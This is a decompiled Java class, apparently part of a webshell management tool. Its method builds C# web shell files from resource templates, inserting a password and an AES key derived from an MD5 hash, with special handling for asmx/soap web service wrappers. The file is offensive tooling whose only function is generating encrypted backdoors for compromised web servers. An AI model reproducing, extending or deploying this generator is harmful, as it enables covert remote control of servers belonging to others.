//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.csharpAes;

import java.io.InputStream;

import core.shellprocessor.StartProcessor;
import util.Log;
import util.functions;

class Generate {
    Generate() {
    }

    public static byte[] GenerateShellLoder(String templateName, String suffix, String pass, String secretKey) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + templateName);
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            // same as original: only pass/secretKey inside the payload stub
            String key16 = functions.md5(secretKey).substring(0, 16);
            String code2 = code.replace("{pass}", pass).replace("{secretKey}", key16);
            InputStream inputStream2 = Generate.class.getResourceAsStream("template/shell." + suffix);
            String template = new String(functions.readInputStream(inputStream2));
            inputStream2.close();
            String assembled = template.replace("{code}", code2);
            // asmx/soap wrappers still have {pass} on the WebMethod name after {code} insert
            if (isWebServiceSuffix(suffix)) {
                String storeName = functions.getRandomString(8);
                assembled = assembled.replace("{pass}", pass)
                        .replace("{secretKey}", key16)
                        .replace("{payloadStoreName}", storeName);
            }
            data = assembled.getBytes();
            data = StartProcessor.process(data, suffix);
        } catch (Exception var10) {
            Log.error(var10);
        }

        return data;
    }

    private static boolean isWebServiceSuffix(String suffix) {
        return suffix != null && ("asmx".equalsIgnoreCase(suffix) || "soap".equalsIgnoreCase(suffix));
    }
}
